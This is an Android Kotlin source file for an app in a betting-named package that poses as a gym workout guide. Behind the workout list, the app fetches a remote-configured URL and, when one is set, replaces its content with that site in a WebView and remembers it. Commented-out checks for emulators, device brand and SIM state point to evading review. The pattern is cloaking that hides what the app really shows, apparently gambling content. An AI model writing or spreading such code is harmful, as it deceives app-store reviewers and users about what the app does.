package olimp.bet.olimpbet.bk.app

import android.content.Context
import android.content.SharedPreferences
import android.content.res.Configuration
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.animation.core.tween
import androidx.compose.foundation.background
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.material.Icon
import androidx.compose.material.Surface
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import com.example.moviesapp.ui.theme.MoviesAppTheme
import com.example.moviesapp.ui.theme.Purple700
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.delay
import olimp.bet.olimpbet.model.ItemRowModel


class MainActivity : ComponentActivity() {

    var sharedPreference: SharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        sharedPreference = this.getSharedPreferences("PREFERENCE_NAME", Context.MODE_PRIVATE)

        val getUrl = sharedPreference!!.getString("url", " ")
        setContent {
            Surface(modifier = Modifier.fillMaxSize()) {

                if (getUrl != " ") {
                    Log.d(
                        "CheckPref",
                        "onCreate: ${getUrl}"
                    )

                    AndroidView(factory = {
                        WebView(this).apply {
                            webViewClient = WebViewClient()
                            loadUrl(getUrl.toString())
                        }
                    })
                } else {
                    UrlIntent()
                }
            }
        }
    }

    @Composable
    fun GymScreen() {
        LazyColumn(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color.LightGray)
        ) {
            itemsIndexed(
                listOf(
                    ItemRowModel(
                        R.drawable.otjimaniya_1__1_,
                        "Day 1: Chest, Biceps, Legs",
                        "Pushups \n" +
                                "\nThe first day of the training program is the most difficult. " +
                                "\nIt involves working on the two largest muscle groups of the body - the chest and legs.\n"
                    ),

                    ItemRowModel(
                        R.drawable.svedeniya_na_grudi__1_, "Chest", "Pushups on the chest \n"
                                + "\nTry to tighten and bring your chest inward as much as possible, putting your hands forward - but without fixing your elbows." +
                                "\n2-3 sets of 12-15 reps"
                    ),

                    ItemRowModel(
                        R.drawable.jim_stangi__1_, "Chest", "Bench Press \n" +
                                "\nWhen performing on a horizontal bench, do not lift your legs up. Optionally, the inclination of the bench can be varied every week. " +
                                "\n3-4 sets of 7-10 reps"
                    ),

                    ItemRowModel(
                        R.drawable.shtanga_na_biceps__1_,
                        "Biceps",
                        "Barbell curls for biceps \n" +
                                "\nDo not sway when lifting the bar and keep your elbows in the same point." +
                                "\n 2-3 sets of 12-15 reps."
                    ),

                    ItemRowModel(
                        R.drawable.podyem_na_biceps_icon__1_,
                        "Biceps",
                        "Biceps Curl with Scott Bench \n" +
                                "When doing lifts in the Scott bench, due to the additional fixation of the elbow, the load on the long head of the biceps is increased - plus, using a curved EZ bar will also help increase the level of involvement of muscle fibers. " +
                                "\n2-3 sets of 8-10 reps."
                    ),
                    ItemRowModel(
                        R.drawable.prisedaniya_so_shtangoy__1_, "Legs", "Squats \n" +
                                "\nCan be done with a barbell or on a leg press machine. As you perform, keep your abs in conscious tension as you lower yourself to the point where your thighs are parallel to the floor. \n3-4 sets of 7-10 reps."
                    ),
                    ItemRowModel(
                        R.drawable.razgibaniya_nog_v_trenajere,
                        "Legs",
                        "Leg extension in the simulator \n" +
                                "\nDon't help yourself lift the weight by arching your torso. Can be replaced with another leg exercise. \n2-3 sets of 12-15 reps"
                    ),

                    ItemRowModel(
                        R.drawable.obratnie_razgibaniya_na_triceps,
                        "Day 2: Shoulders, Triceps, Traps",
                        "Reverse push-ups on the bench \n" +
                                "\nRound and voluminous shoulders will make the figure wider, and large triceps will increase the volume of the arms, visually expanding the biceps. \n" +
                                "\nAt the top point, try to push your body weight as high as possible. 2-3 sets of 12-15 reps."
                    ),

                    ItemRowModel(
                        R.drawable.podyemy_ganteley_v_storony,
                        "Shoulders",
                        "Side dumbbell raises \n" +
                                "\nThe back should be straight, the arms should not bend at the elbows. Raise the weight to the horizontal. \n2-3 sets of 12-15 reps"
                    ),
                    ItemRowModel(
                        R.drawable.poperemennie_podyemy,
                        "Shoulders",
                        "Front dumbbell raises \n" +
                                "\nUse medium weight dumbbells and watch your technique. Start raising your hand only when the opposite hand is at the bottom of the movement. \n2-3 sets of 12-15 reps"
                    ),
                    ItemRowModel(
                        R.drawable.jim_ganteley_sidya, "Shoulders", "Seated Dumbbell Press \n" +
                                "\nWhen performing, keep the press in conscious tension, when lifting the weight up, do not push it out due to the strength of the body - only the shoulders work. \n3-4 sets of 7-10 reps"
                    ),
                    ItemRowModel(
                        R.drawable.ganteli_k_podborodku,
                        "Shoulders",
                        "Lifting dumbbells to the chin \n" +
                                "\nPerform the exercise slowly, involving as many muscle fibers as possible. \n2-3 sets of 12-15 reps"
                    ),
                    ItemRowModel(
                        R.drawable.jim_na_triceps_iz_za_golovy,
                        "Triceps",
                        "Triceps press from behind the head \n" +
                                "\nElbows should be parallel to each other and should not move to the side when moving the weight. Can be replaced with another triceps exercise. \n3-4 sets of 7-10 reps"
                    ),

                    ItemRowModel(
                        R.drawable.podtyagivaniya_1, "Day 3: Back and Abs", "Pull-ups \n" +
                                "\nWhen performing, keep the press in conscious tension, and at the top point, feel the work of the back muscles, pushing the body weight higher. \nDon't swing. 2-3 sets of 12-15 reps."
                    ),
                    ItemRowModel(
                        R.drawable.tyaga_verhnego_bloka_1, "Back", "Top block pull \n" +
                                "\nUsing different handles and grips allows you to modify the exercise and engage different back muscles. \n3-4 sets of 7-10 reps"
                    ),
                    ItemRowModel(
                        R.drawable.skruchivaniya_na_skamye,
                        "Back",
                        "Dumbbell pull to the belt \n" +
                                "\nWhen lifting up, do not hold your breath and do not make sure that the load does not pass to the lower back and lower back. In increased concentration, tighten the press even more. \n3-4 takes 10-15 reps"
                    ),
                    ItemRowModel(
                        R.drawable.uprajnenie_velosiped, "Abs", "Bicycle on the press \n" +
                                "\nIt involves bending the leg at the knee and bringing the opposite elbow to it. It is performed with a tense press and with a full feeling of involvement of the abdominal muscles in the work. \n3-4 sets of 10-15 reps."
                    ),
                    ItemRowModel(
                        R.drawable.planka, "Abs", "Plank \n" +
                                "\nThe bar is performed in a static mode - it is necessary not to repeat the movement, but to linger motionless. Alternate different types (on the elbows, on outstretched arms, side). 3-4 sets of 60-90 sec."
                    ),

                    )
            ) { _, item ->
                MyRow(item = item)
            }

        }
    }

    @Composable
    fun UrlIntent() {
        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)

        remoteConfig.fetchAndActivate().addOnCompleteListener (this) { task ->

            if (task.isSuccessful) {
                val url =  remoteConfig.getString("url");
                val telMgr = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val simState = telMgr.simState

                if (url.isEmpty()
//            || Build.BRAND.contains("google") || Build.SERIAL == "unknown"
//            || simState != TelephonyManager.SIM_STATE_ABSENT
                ) {
                    Log.d("Test2", "UrlIntent: ${url}")
                    Log.d("Test2", "UrlIntent: ${Build.BRAND.contains("google")}")
                    Log.d("Test2", "UrlIntent: ${Build.SERIAL == "unknown"}")

                    setContent {
                        GymScreen()
                    }
                } else {
                    Log.d("Test1", "UrlIntent: ${url.isEmpty()}")
                    Log.d("Test1", "UrlIntent: ${Build.BRAND.contains("google")}")
                    Log.d("Test1", "UrlIntent: ${Build.SERIAL == "unknown"}")

                    setContent {
                        AndroidView(factory = {
                        WebView(this).apply {
                            sharedPreference?.edit()?.putString("url", url)
                            webViewClient = WebViewClient()
                            loadUrl(url)
                            Log.d("check_url", "UrlIntent:$url")
                        }
                    })
                    }
                }
                }
            }
        }

}
